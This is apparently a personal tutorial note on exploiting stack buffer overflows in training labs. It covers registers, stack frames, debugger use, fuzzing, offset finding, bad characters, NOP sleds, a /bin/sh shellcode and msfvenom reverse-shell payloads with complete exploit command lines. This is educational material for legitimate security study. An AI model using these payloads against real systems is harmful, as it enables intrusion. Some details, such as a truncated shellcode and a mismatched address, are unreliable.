
#### Where to test buffer overflow

THM rooms and other exercises:
https://tryhackme.com/r/room/bof1 (Linux, r2 and gdb)
https://tryhackme.com/r/room/bufferoverflowprep (Windows, Immunity debugger)
https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/ (VM ISO)

Real world buffer overflow examples:
https://www.bleepingcomputer.com/news/security/you-can-bypass-authentication-on-hpe-ilo4-servers-with-29-a-characters/
https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit

Al tips:
"Hacking: The Art of Exploitation" book to check out
tool bofuzz

### What is Buffer Overflow

Buffer overflow is when vulnerable code allows us to writes over a bigger section of memory than it should.
The C functions gets(), strcopy(), sprintf, scanf and strcat() are examples of functions that doesn't check the available space before writing.

Example
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
<font size=2>When we enter up to 14 characters we get "Try again?". If we enter 15, we get "You have...". Since the string is null terminated when we enter 14 characters the int will be overwritten toooo. (We tested this be changing the init value and test value to 1.)</font>

### Low level program execution - Assembler

#### Registers

There are a number of registers, tiny bits of memory inside the processor, with special purposes.

The most important ones are:
- The Instruction pointer, ip, that keeps track of where in memory we are currently reading and executing instructions.
- The Stack pointer, sp, that keeps track of the memory address of the top of the stack.
- The Base pointer, bp, that keeps track of the memory address of current stack frame's start (aka Stack base pointer or Frame pointer)

There are also other registers, for example ax and bx, that have different specific functions in the execution of a program. Also the names of the registers are added to depending on the number of bits the program can handle.

More about registers here: [[Registers x86]]

#### Memory layout

When a program is executed two main areas of the computers memory are used, the stack and the heap.

##### The heap

The heap is mostly used for dynamically assigned memory.

##### The stack

A thing you need to remember about the stack is that it grows downwards - This means that for example when space for a new variable is declared the adress of this will be lower than the last one declared.

The stack is mainly used for saving smaller amounts of data. The most important being the next instruction to run and other registers after a function is called, local variables...

The assembler instructions push and pop can be used to quickly add/remove something to/from the stack, like a plate on a stack of plates (the reason for the name stack).

###### What push and pop actually does

push value:
`sub esp, 4`              Decrease the stack pointer by the size of the data (4 bytes)
`mov [esp], value`   Store the value at the address now pointed to by ESP

pop destination:
`mov destination, [esp]`  Load the value at ESP into the destination
`add esp, 4`                        Increase the stack pointer by the size of the data (4 bytes)

##### Stack Frames

For every function that is run a new bit of the stack is used. The old top of the stack (esp) will now be the base of the new Stack Frame (ebp). The stack frame will contain:
- the old instruction pointer (eip)
- the old base pointer (ebp)
- other registers saved by the code (compiler/programmer)
- local variables
The new top of the stack (esp) will be the stack frames top.

As you can see in the images a buffer is addressed from the "bottom" as the stack is growing to lower memory addresses.

![[Images/KmWsaIs.png|250]]    ![[Images/lqE6o0S.png|275]]

And when we put to much data into the buffer and get a buffer overflow it will overwrite what was previously put on the stack. First other variables, then other saved registers and then the saved base pointer (ebp) and instruction pointer (eip).

![[Images/buffer_overflow_2.webp|700]]

When we later leave the function, this will all reverse. The saved base pointer and instruction pointer are read back into the registers we will get a segmentation fault if they don't contain usable values. We need to get the right values into the right places.

#### Program flow in assembler

##### Call of function

Call does:
push eip            Saves the old instruction pointer to the stack
jmp function     Sets the instruction pointer to the functions memory address

##### Function Prologue

A function starts with:
push ebp           Save the old base pointer to the stack
mov ebp, esp    Copies the old stack pointer as a new base pointer
push ebx           Push possible regs that will be used in the function
sub esp, 0x404  Make space for the functions variables.. on the stack (in this case a char buffer of 1024 characters)

##### Function Epilogue

A function end with:
leave      = mov esp, ebp   Save the old base pointer as a new stack pointer
         pop ebp            Get the old base pointer from the stack
ret          = pop eip            Get the old instruction pointer from the stack

Meaning leave and ret are really shorthand for these.


#### Exploring memory (stack and heap)

When we find a buffer overflow vulnerability we need more information. We can use different tools to explore memory and to debug and step through program execution. Hopefully we can run the program in a debugger or attach to a process with a GUI debugger like like edb (Linux) or Immunity debugger (Windows).

There are lots of tools available to debug and explore applications in different ways. For Linux we have for example [[r2 (radare2)]], [[gdb]], lldb, [[objdump]], readelf and edb (graphical). For Windows there are WinDbg, OllyDbg, Immunity Debugger, (IDA)... A modern choice is [[x64dbg (and x32dbg)]].

The simplest for basic info might be objdump:
`objdump -d <program>` disassemble program to get function adress..

More complex with almost infinite possibilities tools like are gdb and r2...

Examples gdb:

```sh
(gdb) info functions
0x0000000000400527  copy_arg
0x0000000000400564  main
...
```

```sh
(gdb) info registers
rax            0x400564 4195684
rbx            0x0      0
rbp            0x7fffffffe3b0   0x7fffffffe3b0
rsp            0x7fffffffe3b0   0x7fffffffe3b0
rip            0x400568 0x400568 <main+4>
...
```

```sh
(gdb) disassemble main
Dump of assembler code for function main:
   0x000011d2 <+0>:     lea    ecx,[esp+0x4]
   0x000011d6 <+4>:     and    esp,0xfffffff0
   0x000011d9 <+7>:     push   DWORD PTR [ecx-0x4]
   0x000011dc <+10>:    push   ebp
   0x000011dd <+11>:    mov    ebp,esp
```

```sh
(gdb) x/40x $sp
0x7fffffffdd30: 0x00000000      0x00000000      0xf7fe6c40      0x00007fff
0x7fffffffdd40: 0x00000000      0x00000000      0xf7ffdab0      0x00007fff
0x7fffffffdd50: 0x00000001      0x00000000      0xf7decc8a      0x00007fff
0x7fffffffdd60: 0xffffde50      0x00007fff      0x55555159      0x00005555
...
```


Examples r2:

```sh
[0x7ffff7dd9ef0]> afl
0x00400527    1 61           sym.copy_arg
0x00400564    1 51           main
...
```

```sh
[0x0040052b]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rsp = 0x7fffffffe2d0
rbp = 0x7fffffffe2d0
rip = 0x0040052b
...
```

```sh
[0x7ffff7dd9ef0]> pdf @main
┌ 51: int main (int argc, char **argv, char **envp);
│           0x00400564      55             push rbp
│           0x00400565      4889e5         mov rbp, rsp
│           0x00400568      4883ec10       sub rsp, 0x10
│           0x0040056c      897dfc         mov dword [var_4h], edi     ; argc
│           0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv
...
```

```sh
[0x00400532]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
...
```

### Buffer Overflow
#### Is there a Buffer Overflow

First we need an input to test for overflow. It can be any other kind of input (user input, command line arguments, network commands, environment variables...). 

We can perform basic tests where we try different input, increasing the size to see if the program crashes:
`python -c "print('A' * 64)" | ./<program>`
`python -c "print('A' * 100)" | ./<program>`
`python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./<program>`
`echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./<program>`
`perl -e 'print "A"x64 . "\x24\x84\x04\x08"' | ./<program>`

``./<program> `python -c "print('A' * 64 + '\x64\x63\x62\x61')"` ``
`./<program> $(python -c "print('A' * 64 + '\x64\x63\x62\x61')")`
`./<program> 'echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0"'`

Confirm buffer overflow:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1200"))
Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

##### GUI programs

**Field**            **Example**
`Text Input Fields`  - Program's "license registration" field.
				- Various text fields found in the program's preferences.
`Opened Files`       Any file that the program can open.
`Program Arguments`  Various arguments accepted by the program during runtime.              
`Remote Resources`   Any files or resources loaded by the program on run time or on a certain condition
...

##### Test input file creation

Create a file with 10000 As:
`python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"`

Create a non random file for finding the pos to overwrite:
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
`python -c "print('the random string', file=open('fuzz.wav', 'w'))"`

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31684630` where 0x31684630 is the contents of eip at the buffer overflow crash

#### Check position of saved instruction pointer on stack

The next step is to change the value of the instruction pointer. This cannot be done directly, as it is read only, but the old value of the instruction pointer is saved on the stack when a function is called. This is where it can possibly be overwritten.

We want to see what part of the input we gave ends up where in memory. You can make a string to test with manually or use a tool.

Metasploit has two helpful scripts. One to generate a non-repetitive string and one to give us the offset (position) of a part of this string.

`/usr/share/metasploit-framework/tools/exploit/pattern-create.rb`
	`-l`, `--length <length>`         The length of the pattern
    `-s`, `--sets <ABC,def,123>`   Custom Pattern Sets
    `-h`, `--help`                             Show help
	`./pattern_create.rb -l 500` Creates a non-repetitive string with length 500

`/usr/share/metasploit-framework/tools/exploit/pattern-offset.rb`
    `-q`, `--query Aa0A`                 Query to Locate
    `-l`, `--length <length>`        The length of the pattern
    `-s`, `--sets <ABC,def,123>`  Custom Pattern Sets
    `-h`, `--help`                            Show help
	`./pattern_offset -l 500 -q 63413163` Returns the position of the 0x63413163`

Example:
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
gdb -q bow32
run $(cat pattern.txt)
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569        
[*] Exact match at offset 1036
```

Test that the position is correct:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1036 + '\x66' * 4)")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Yay, we can set eip!

Remember this number for later!


#### Find out how much space we have for shellcode

...

#### Find bad characters

We need to find out if all bytes are acceptable input. We can probably assume that null will terminate the string ;)

All 256 two hex digit possibilities: `"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`

Common bad characters
- `\x00` - Null byte
- `\x08` – Backspace
- `\x09` - Horizontal tab
- `\x0A` – Line Feed (LF) or Newline
- `\x0B` – Vertical Tab (VT)
- `\x0C` – Form Feed (FF)
- `\x0D` – Carriage Return (CR)
- `\x20` – Space
- `\x25` - Percent (%)
- `\x2E` - period, dot
- `\x2F` - Forward slash (/)
- `\x5C` - Backslash ()
- `\x5F` - Underscore
- `\xFF` - Often used as EOF (End of file)

ex. `\x00\x09\x0a\x20`

Suggestion from n1ght3r: Use there and don't check every time `\x00\x0a\x0d\x5c\x5f\x2f\x2e`.

To do this we will send all characters along with the input:
`run $(python -c 'print("\x55" * (1040 - 256 - 4) + "\x00\x01\x02..<SNIP>...xfd\xfe\xff" + "\x66" * 4)')`

Then we look in memory if all characters are there:
`x/2000xb $esp+500`
`(gdb) x/2000xb $esp+2200`
(<font color=red>Observe we have to break program execution with a breakpoint</font>)

```sh
0xffffd668:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd670:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd678:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd680:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd688:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd690:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd698:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
0xffffd6a0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
0xffffd6a8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14
0xffffd6b0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c
0xffffd6b8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24
0xffffd6c0:     0x25    0x26    0x27    0x28    0x29    0x2a    0x2b    0x2c
0xffffd6c8:     0x2d    0x2e    0x2f    0x30    0x31    0x32    0x33    0x34
```
Instead of 0x09 we have 0x00. This means 0x09 is a bad character.

There will be characters missing in memory. Remove one at a time from the start and write them down. Then repeat until you have found all characters.

ex badchars in hex: `\x00\x09\x0A\x20`

#### Using shell code

We want to put code in memory and then redirect execution to this memory.

We use a number of nop instructions to make the address of the exploit easier to get to. If we have 30 nops all addresses within these will lead execution to the shell code.

Structure of the input:
`python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"`

Example:
`python -c "print('\x90'*30+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*60+'\xef\xbe\xad\xde')" | ./program`


#### Example shell code

Shell code that opens a basic shell (source THM) (useful if SUID is set)
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```
28 bytes

The shell code disassembled using r2, commands aaa and then pdf:
![[Images/Pasted image 20240809204245.png]]
<font size=2>A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.<br>
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.<br>
RCX is then pushed onto the stack.<br>
Other requirements for the syscall (execve) to exectue the path are prepared and then the syscall is made.</font>

#### Generate shell code

`msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>`

`msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

`msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

```sh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb"
"\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b"
"\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2"
"\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8"
"\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3"
"\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee";
```

Shellcode: 
```
\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee
```

Number of bytes: 95

#### Find the execution start address

the position returned by pattern_offset.rb = 2060
a random number of nops = 256
the number of bytes in the payload = 95
32-bit executable gives a 32-bit address = 4 bytes

```sh
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x66" * 4')
```

Afterwards we confirm that it's been entered  into memory in the format we supplied with python.

```sh
(gdb) x/2000xb $esp+2200

0xffffd6b1:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6b9:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6c1:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6c9:     0x55    0x90    0x90    0x90    0x90    0x90    0x90    0x90  Nops
0xffffd6d1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6d9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6e1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6e9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd701:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd709:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd711:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd719:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd721:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd729:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd731:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd739:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd741:     0x90    0x90    0x90    0x90    0x90    0xbd    0xca    0x92  Shell code
0xffffd749:     0xd0    0xf7    0xdb    0xcd    0xd9    0x74    0x24    0xf4
0xffffd751:     0x5b    0x31    0xc9    0xb1    0x12    0x83    0xc3    0x04
0xffffd759:     0x31    0x6b    0x0e    0x03    0xa1    0x9c    0x32    0x02
0xffffd761:     0x04    0x7a    0x45    0x0e    0x35    0x3f    0xf9    0xbb
0xffffd769:     0xbb    0x36    0x1c    0x8b    0xdd    0x85    0x5f    0x7f
0xffffd771:     0x78    0xa6    0x5f    0x4d    0xfa    0x8f    0xe6    0xb4
0xffffd779:     0x92    0x70    0x19    0x47    0x63    0xe7    0x1b    0x47
0xffffd781:     0x19    0x9e    0x92    0xa6    0x6d    0x06    0xf5    0x79
0xffffd789:     0xde    0x74    0xf6    0xf0    0x01    0xb7    0x79    0x50
0xffffd791:     0xa9    0x26    0x55    0x26    0x41    0xdf    0x86    0xe7
0xffffd799:     0xf3    0x76    0x50    0x14    0xa1    0xdb    0xeb    0x3a
0xffffd7a1:     0xf5    0xd7    0x26    0x3c    0x66    0x66    0x66    0x66  66666666 repersents the spot where the instruction pointer will be restored from
```

We select an address in the middle of out nops, `0xffffd731`, as our start address.

Remember the endianness and reverse the address when adding it to the python:
0xffffcc90
```sh
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x31\xd7\xff\xff"')
```

Now our shellcode will hopefully be run!

```

run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x31\xd7\xff\xff"')

run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x66" * 4')


```

---

## Full Example

to continue:

```sh
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db